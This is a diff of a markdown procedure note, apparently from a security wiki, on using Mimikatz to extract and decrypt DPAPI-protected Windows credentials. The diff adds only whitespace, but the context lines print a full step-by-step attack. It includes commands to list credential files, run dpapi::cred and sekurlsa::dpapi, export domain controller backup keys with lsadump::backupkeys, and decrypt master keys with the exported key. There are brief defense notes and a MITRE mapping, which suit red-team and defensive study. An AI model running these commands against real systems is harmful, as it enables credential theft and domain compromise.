@@ -38,6 +38,8 @@ This procedure involves using Mimikatz to retrieve and decrypt Windows credentia
 
 This procedure involves using Mimikatz to retrieve and decrypt Windows credentials that are protected using the Data Protection API (DPAPI). DPAPI is a Windows API that provides protection for sensitive data, such as passwords, by encrypting it with a key derived from the user's credentials. Mimikatz is a tool that can be used to extract these credentials from memory, and then decrypt them using the appropriate DPAPI key. This technique can be used by an attacker to gain access to sensitive information, such as usernames and passwords, that are stored on a Windows system.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows system
@@ -45,6 +47,8 @@ This procedure involves using Mimikatz to retrieve and decrypt Windows credentia
 1. Privileged access to run Mimikatz
 
 1. Knowledge of the DPAPI key used to protect the credentials
+
+ 
 
 ## Defense
 
@@ -54,11 +58,15 @@ This procedure involves using Mimikatz to retrieve and decrypt Windows credentia
 
 1. Implement strong password policies and multi-factor authentication to reduce the impact of credential theft
 
+ 
+
 ## Objectives
 
 1. Retrieve Windows credentials from a target system
 
 1. Decrypt DPAPI-protected credentials using Mimikatz
+
+ 
 
 # Instructions
 
@@ -76,10 +84,18 @@ This procedure involves using Mimikatz to retrieve and decrypt Windows credentia
 6. Use the backup keys by running the command:
    dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
 
+ 
+
+
+
 **Code**: [[# check the folder to find credentials
 dir C:\User]]
 
+
+
 > This command can be used to retrieve and decrypt Windows credentials. The command utilizes a number of tools, including mimikatz and lsadump, to find and decrypt the credentials. The instructions provided explain how to use the command to retrieve and decrypt the credentials step-by-step. It is important to note that this command should only be used for authorized purposes and with appropriate permissions.
+
+
 
 **Command** ([[Check Credentials Folder]]):
 
@@ -87,11 +103,19 @@ dir C:\User]]
 dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
 ```
 
+
+
+
+
 **Command** ([[Use Mimikatz to Decrypt Credentials]]):
 
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
 ```
+
+
+
+
 
 **Command** ([[Find Master Key]]):
 
@@ -99,11 +123,19 @@ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials
 mimikatz !sekurlsa::dpapi
 ```
 
+
+
+
+
 **Command** ([[Use Master Key to Decrypt Credentials]]):
 
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
+
+
+
+
 
 **Command** ([[Export Backup Keys]]):
 
@@ -111,11 +143,17 @@ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials
 lsadump::backupkeys /system:dc01.lab.local /export
 ```
 
+
+
+
+
 **Command** ([[Use Backup Keys to Decrypt Credentials]]):
 
 ```bash
 dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -146,3 +184,5 @@ dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-
 - [[Data Protection API]]
 - [[Mimikatz - Credential Manager & DPAPI]]
 - [[Windows - DPAPI]]
+
+
